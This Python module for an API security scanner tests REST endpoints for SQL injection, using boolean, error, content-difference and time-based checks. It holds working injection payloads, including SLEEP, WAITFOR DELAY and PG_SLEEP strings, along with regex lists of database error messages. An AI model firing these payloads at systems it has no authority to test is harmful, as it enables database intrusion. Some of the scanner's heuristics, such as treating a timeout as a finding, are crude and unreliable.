import time
import re
import logging
from typing import Dict, Optional
from utils.api_client import make_api_request
from .custom_payloads import get_payloads
from models import TestResult, APITestRequest
from difflib import SequenceMatcher

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# SQL error patterns for various databases
SQL_ERROR_PATTERNS = [
    r"SQL.*error",
    r"ORA-[0-9]{5}",
    r"MySQL.*error",
    r"Syntax error",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"SQLiteException",
    r"PostgreSQL.*ERROR",
    r"Microsoft SQL Server",
    r"ODBC Driver",
    r"JDBC Driver",
    r"PdoException",
    r"SQL syntax",
    r"Warning.*mysql",
    r"Unclosed quotation mark",
    r"Database error",
    r"SQLSTATE\[",
    r"Driver.*error",
    r"SQL command not properly ended",
    r"invalid SQL statement",
]

# Sensitive data patterns that might indicate information leakage
SENSITIVE_DATA_PATTERNS = [
    r"password",
    r"credit_card",
    r"ssn",
    r"secret",
    r"token",
    r"private",
    r"auth",
    r"session",
]

def contains_sql_error(response_text: str) -> bool:
    """Check if response contains SQL error patterns"""
    response_text = response_text.lower()
    return any(re.search(pattern, response_text, re.IGNORECASE) for pattern in SQL_ERROR_PATTERNS)

def contains_sensitive_data(response_text: str) -> bool:
    """Check if response contains sensitive data patterns"""
    response_text = response_text.lower()
    return any(re.search(pattern, response_text) for pattern in SENSITIVE_DATA_PATTERNS)

def response_differs_significantly(baseline: dict, current: dict, threshold: float = 0.3) -> bool:
    """
    Compare responses for significant differences in:
    - Status code
    - Response length
    - JSON structure (if applicable)
    - Content similarity
    """
    # Compare status codes
    if baseline["status"] != current["status"]:
        return True
    
    # Compare response length (more than 30% difference)
    length_diff = abs(len(baseline["text"]) - len(current["text"]))
    if length_diff > (len(baseline["text"]) * threshold):
        return True
    
    # For JSON responses, compare structure
    try:
        import json
        baseline_json = json.loads(baseline["text"])
        current_json = json.loads(current["text"])
        
        # If structure changed (different keys)
        if set(baseline_json.keys()) != set(current_json.keys()):
            return True
            
        # If array length changed significantly
        if isinstance(baseline_json, list) and isinstance(current_json, list):
            if abs(len(baseline_json) - len(current_json)) > 3:
                return True
    except:
        pass
    
    # Compare content similarity
    similarity = SequenceMatcher(None, baseline["text"], current["text"]).ratio()
    if similarity < 0.7:  # More than 30% different
        return True
    
    return False

async def measure_response_time(request_func, *args, **kwargs) -> float:
    """Measure response time with statistical significance (median of 3 requests)"""
    times = []
    for _ in range(3):  # Take multiple measurements
        start = time.time()
        await request_func(*args, **kwargs)
        times.append(time.time() - start)
    
    return sorted(times)[len(times)//2]  # Return median

async def test_boolean_based(test_request: APITestRequest, param_key: str, baseline: dict) -> Optional[TestResult]:
    """Test for boolean-based SQL injection"""
    true_payload = f"1' AND 1=1 --"
    false_payload = f"1' AND 1=2 --"
    
    try:
        true_response = await make_api_request(
            method=test_request.method,
            url=test_request.url,
            headers=test_request.headers,
            params={**test_request.params, param_key: true_payload},
            body=test_request.body
        )
        
        false_response = await make_api_request(
            method=test_request.method,
            url=test_request.url,
            headers=test_request.headers,
            params={**test_request.params, param_key: false_payload},
            body=test_request.body
        )
        
        true_data = {
            "status": true_response.status_code,
            "text": true_response.text
        }
        
        false_data = {
            "status": false_response.status_code,
            "text": false_response.text
        }
        
        if response_differs_significantly(true_data, false_data):
            return TestResult(
                test_name="SQL Injection (Boolean-Based)",
                vulnerable=True,
                confidence=0.85,
                description="Boolean-based SQL injection vulnerability detected",
                payload=f"TRUE: {true_payload}, FALSE: {false_payload}",
                recommendation="Use parameterized queries"
            )
            
    except Exception as e:
        logger.error(f"Boolean-based test failed: {str(e)}")
    
    return None

async def test_sql_injection(test_request: APITestRequest) -> TestResult:
    if test_request.api_type != "REST":
        return TestResult(
            test_name="SQL Injection (REST)",
            vulnerable=False,
            confidence=0.0,
            description="SQL injection test only available for REST APIs in this module",
            recommendation="N/A"
        )
    
    payloads = get_payloads("sql", "REST")
    
    # Log the initial request
    logger.info(f"Testing SQL injection on {test_request.url} with params {test_request.params}")
    
    # Find the parameter to inject the payload into
    param_key = next(iter(test_request.params), None) if test_request.params else "id"
    if not param_key:
        logger.warning("No parameters found in the request to test for SQL injection.")
        return TestResult(
            test_name="SQL Injection (REST)",
            vulnerable=False,
            confidence=0.0,
            description="No parameters provided to test for SQL injection",
            recommendation="Ensure the API request includes query parameters"
        )
    
    # Get baseline response
    try:
        baseline_response = await make_api_request(
            method=test_request.method,
            url=test_request.url,
            headers=test_request.headers,
            params=test_request.params,
            body=test_request.body
        )
        
        baseline_data = {
            "status": baseline_response.status_code,
            "text": baseline_response.text,
            "headers": dict(baseline_response.headers)
        }
        
        logger.info(f"Baseline response: status={baseline_data['status']}, length={len(baseline_data['text'])}")
        
        # Measure baseline response time
        baseline_time = await measure_response_time(
            make_api_request,
            method=test_request.method,
            url=test_request.url,
            headers=test_request.headers,
            params=test_request.params,
            body=test_request.body
        )
        logger.info(f"Baseline response time: {baseline_time:.2f}s")
        
    except Exception as e:
        logger.error(f"Failed to get baseline response: {str(e)}")
        return TestResult(
            test_name="SQL Injection (REST)",
            vulnerable=False,
            confidence=0.0,
            description=f"Failed to get baseline response: {str(e)}",
            recommendation="Check the API endpoint and request format"
        )

    # First run boolean-based test
    boolean_result = await test_boolean_based(test_request, param_key, baseline_data)
    if boolean_result:
        return boolean_result

    # Test each standard payload
    for payload in payloads:
        modified_params = {**test_request.params, param_key: payload}
        
        try:
            # Time measurement
            start_time = time.time()
            response = await make_api_request(
                method=test_request.method,
                url=test_request.url,
                headers=test_request.headers,
                params=modified_params,
                body=test_request.body
            )
            elapsed_time = time.time() - start_time
            
            response_data = {
                "status": response.status_code,
                "text": response.text,
                "headers": dict(response.headers)
            }
            
            logger.info(f"Testing payload: {payload[:50]}...")
            logger.debug(f"Response status: {response_data['status']}")
            
            # 1. Check for SQL errors in response
            if contains_sql_error(response_data["text"]):
                logger.info("SQL error detected in response")
                return TestResult(
                    test_name="SQL Injection (Error-Based)",
                    vulnerable=True,
                    confidence=0.95,
                    description=f"Error-based SQL Injection detected with payload: {payload}",
                    payload=payload,
                    recommendation="Use parameterized queries"
                )
            
            # 2. Check for sensitive data exposure
            if contains_sensitive_data(response_data["text"]):
                logger.info("Sensitive data detected in response")
                return TestResult(
                    test_name="SQL Injection (Data Exposure)",
                    vulnerable=True,
                    confidence=0.9,
                    description=f"Sensitive data exposed with payload: {payload}",
                    payload=payload,
                    recommendation="Implement proper data access controls"
                )
            
            # 3. Check for content differences
            if response_differs_significantly(baseline_data, response_data):
                logger.info("Significant content differences detected")
                return TestResult(
                    test_name="SQL Injection (Content-Based)",
                    vulnerable=True,
                    confidence=0.8,
                    description=f"Content differences detected with payload: {payload}",
                    payload=payload,
                    recommendation="Validate all inputs"
                )
            
            # 4. Check for time delays
            time_threshold = max(4, baseline_time * 2)  # Either >4s or 2x baseline
            if elapsed_time > time_threshold:
                logger.info(f"Time delay detected: {elapsed_time:.2f}s > {time_threshold:.2f}s")
                return TestResult(
                    test_name="SQL Injection (Time-Based)",
                    vulnerable=True,
                    confidence=0.85,
                    description=f"Time delay detected ({elapsed_time:.2f}s) with payload: {payload}",
                    payload=payload,
                    recommendation="Implement query timeouts"
                )
                
        except Exception as e:
            error_msg = str(e).lower()
            logger.error(f"Test failed with payload '{payload}': {error_msg}")
            
            # Consider some exceptions as potential indicators
            if "timeout" in error_msg or "connection reset" in error_msg:
                return TestResult(
                    test_name="SQL Injection (Potential)",
                    vulnerable=True,
                    confidence=0.7,
                    description=f"Request failed in suspicious way: {error_msg}",
                    payload=payload,
                    recommendation="Investigate server logs"
                )
    
    # Time-based SQL injection detection (specific sleep/delay payloads)
    time_based_payloads = [
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' OR BENCHMARK(5000000,MD5(NOW()))--",
        "1' AND MAKE_SET(1=1,SLEEP(5))--",
        "1'; SELECT PG_SLEEP(5)--"
    ]
    
    for payload in time_based_payloads:
        try:
            start_time = time.time()
            modified_params = {**test_request.params, param_key: payload}
            await make_api_request(
                method=test_request.method,
                url=test_request.url,
                headers=test_request.headers,
                params=modified_params,
                body=test_request.body
            )
            elapsed_time = time.time() - start_time
            
            # Dynamic threshold - either 5 seconds or 3x baseline time
            time_threshold = max(5, baseline_time * 3) if 'baseline_time' in locals() else 5
            
            if elapsed_time > time_threshold:
                logger.info(f"Time-based SQLi detected - delay: {elapsed_time:.2f}s with payload: {payload}")
                return TestResult(
                    test_name="SQL Injection (Time-Based)",
                    vulnerable=True,
                    confidence=0.9,
                    description=f"Time-based SQL Injection detected (delay: {elapsed_time:.2f}s) with payload: {payload}",
                    payload=payload,
                    recommendation="Use parameterized queries and implement query timeouts"
                )
        except Exception as e:
            if "timeout" in str(e).lower():
                logger.info(f"Timeout occurred with time-based payload: {payload}")
                return TestResult(
                    test_name="SQL Injection (Time-Based)",
                    vulnerable=True,
                    confidence=0.85,
                    description=f"Request timeout with time-based payload: {payload}",
                    payload=payload,
                    recommendation="Implement query timeouts and review SQL injection protections"
                )
            continue

    # Final return if no vulnerabilities found
    logger.info("No SQL injection vulnerabilities detected")
    return TestResult(
        test_name="SQL Injection (REST)",
        vulnerable=False,
        confidence=0.0,
        description="No SQL Injection vulnerabilities detected",
        payload=None,
        recommendation="Continue to validate and sanitize inputs"
    )